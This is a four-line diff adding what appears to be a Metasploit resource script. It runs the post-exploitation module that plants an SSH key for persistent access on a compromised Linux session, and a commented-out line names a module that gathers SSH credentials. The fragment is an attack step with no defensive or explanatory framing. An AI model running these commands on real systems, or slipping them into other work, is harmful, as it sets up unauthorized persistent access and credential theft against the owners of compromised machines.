@@ -1,0 +1,4 @@
+use post/linux/manage/sshkey_persistence
+set session 1
+run
+#post/multi/gather/ssh_creds
